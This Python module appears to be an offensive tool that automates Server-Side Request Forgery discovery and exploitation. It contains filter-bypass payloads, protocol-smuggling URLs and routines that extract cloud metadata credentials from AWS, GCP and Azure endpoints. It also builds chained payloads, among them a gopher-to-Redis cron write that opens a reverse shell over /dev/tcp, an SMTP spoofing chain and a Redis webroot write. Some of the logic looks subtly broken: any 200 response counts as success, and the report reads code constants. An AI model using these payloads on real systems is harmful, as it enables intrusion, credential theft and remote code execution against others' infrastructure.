"""
SSRF Chaining Helper Module
Automates Server-Side Request Forgery discovery and exploitation chains
"""
import asyncio
import aiohttp
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode, quote
import base64
import json

class SSRFChainer:
    """Automated SSRF discovery and exploitation chaining"""
    
    def __init__(self, target: str, callback_server: str = None, stealth_mode: bool = False):
        self.target = target
        self.callback_server = callback_server or "https://your-callback.server"
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        
        self.internal_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",
            "http://metadata.google.internal",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
        ]
        
        self.cloud_metadata_endpoints = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document"
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token"
            ],
            "digitalocean": [
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1.json"
            ]
        }
        
        self.bypass_payloads = [
            lambda url: url,
            lambda url: url.replace("127.0.0.1", "127.1"),
            lambda url: url.replace("127.0.0.1", "0x7f000001"),
            lambda url: url.replace("127.0.0.1", "2130706433"),
            lambda url: url.replace("127.0.0.1", "017700000001"),
            lambda url: url.replace("localhost", "localtest.me"),
            lambda url: url.replace("localhost", "127.0.0.1.nip.io"),
            lambda url: url.replace("http://", "http://evil.com@"),
            lambda url: f"{url}#fragment",
            lambda url: f"{url}?ignored",
            lambda url: url.replace("://", "://" + quote("@")),
            lambda url: url + "%00.allowed-domain.com",
            lambda url: url + "%0d%0a.allowed-domain.com",
        ]
        
        self.protocol_smuggling = [
            "gopher://",
            "dict://",
            "file:///etc/passwd",
            "sftp://",
            "ldap://",
            "tftp://",
        ]
    
    async def scan_ssrf(self, params: List[str] = None) -> List[Dict]:
        """Scan for SSRF vulnerabilities"""
        if params is None:
            params = ["url", "uri", "path", "dest", "redirect", "callback", "next", 
                     "data", "load", "file", "page", "target", "domain", "site"]
        
        async with aiohttp.ClientSession() as session:
            for param in params:
                for internal_target in self.internal_targets:
                    for bypass_fn in self.bypass_payloads:
                        bypassed_url = bypass_fn(internal_target)
                        await self._test_ssrf(session, param, bypassed_url)
        
        return self.findings
    
    async def _test_ssrf(self, session: aiohttp.ClientSession, param: str, payload: str):
        """Test SSRF with specific parameter and payload"""
        try:
            test_urls = [
                f"{self.target}?{param}={quote(payload)}",
                f"{self.target}/{param}/{quote(payload)}",
            ]
            
            for test_url in test_urls:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
                
                async with session.get(test_url, headers=headers, timeout=10, allow_redirects=False) as response:
                    content = await response.text()
                    
                    if self._detect_ssrf_success(content, payload, response):
                        self.findings.append({
                            "type": "SSRF",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "response_code": response.status,
                            "severity": self._classify_severity(payload),
                            "evidence": content[:500]
                        })
                
                if self.stealth_mode:
                    await asyncio.sleep(0.5)
                    
        except Exception as e:
            pass
    
    def _detect_ssrf_success(self, content: str, payload: str, response) -> bool:
        """Detect if SSRF was successful"""
        indicators = [
            "root:x:",
            "uid=",
            "ami-",
            "instance-id",
            "availabilityZone",
            "privateIp",
            "accessKeyId",
            "secretAccessKey",
            "metadata",
            "computeMetadata",
            "Connection refused",
            "Connection reset",
        ]
        
        error_indicators = [
            "not found",
            "invalid url",
            "forbidden",
            "bad request",
        ]
        
        content_lower = content.lower()
        
        if response.status in [200, 301, 302] and "localhost" in payload:
            for indicator in indicators:
                if indicator.lower() in content_lower:
                    return True
        
        if any(err in content_lower for err in error_indicators):
            return False
            
        if response.status == 200 and len(content) > 0:
            return True
            
        return False
    
    def _classify_severity(self, payload: str) -> str:
        """Classify SSRF severity based on payload"""
        if "169.254.169.254" in payload or "metadata" in payload:
            return "Critical"
        elif "127.0.0.1" in payload or "localhost" in payload:
            return "High"
        elif any(ip in payload for ip in ["192.168", "10.0", "172.16"]):
            return "Medium"
        else:
            return "Low"
    
    async def exploit_cloud_metadata(self) -> Dict:
        """Attempt to extract cloud metadata via SSRF"""
        results = {}
        
        async with aiohttp.ClientSession() as session:
            for cloud, endpoints in self.cloud_metadata_endpoints.items():
                results[cloud] = []
                for endpoint in endpoints:
                    for bypass_fn in self.bypass_payloads[:3]:
                        bypassed = bypass_fn(endpoint)
                        finding = await self._try_metadata_extraction(session, bypassed)
                        if finding:
                            results[cloud].append(finding)
        
        return results
    
    async def _try_metadata_extraction(self, session: aiohttp.ClientSession, endpoint: str) -> Optional[Dict]:
        """Try to extract metadata from cloud endpoint"""
        params = ["url", "uri", "path", "dest", "redirect"]
        
        for param in params:
            try:
                test_url = f"{self.target}?{param}={quote(endpoint)}"
                headers = {
                    "User-Agent": "Mozilla/5.0",
                    "Metadata-Flavor": "Google",
                    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
                }
                
                async with session.get(test_url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(kw in content.lower() for kw in ["ami-", "instance", "account", "token", "credentials"]):
                            return {
                                "endpoint": endpoint,
                                "parameter": param,
                                "data": content[:1000],
                                "severity": "Critical"
                            }
            except:
                pass
        
        return None
    
    def generate_chain_payload(self, chain_type: str) -> str:
        """Generate SSRF chaining payloads"""
        chains = {
            "gopher_redis": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0ashell%0d%0a$60%0d%0a\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\n\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
            
            "gopher_smtp": "gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20Test%0d%0a%0d%0aSSRF%20Email%20sent%0d%0a.%0d%0aQUIT%0d%0a",
            
            "dict_redis": "dict://127.0.0.1:6379/CONFIG SET dir /var/www/html",
            
            "file_read": "file:///etc/passwd",
            
            "aws_metadata_chain": [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.169.254/latest/user-data"
            ]
        }
        
        return chains.get(chain_type, "Unknown chain type")
    
    def get_report(self) -> Dict:
        """Generate SSRF exploitation report"""
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.get("severity") == "Critical"]),
            "high": len([f for f in self.findings if f.get("severity") == "High"]),
            "findings": self.findings,
            "available_chains": list(self.generate_chain_payload.__code__.co_consts[1].keys()) if hasattr(self.generate_chain_payload.__code__, 'co_consts') else []
        }
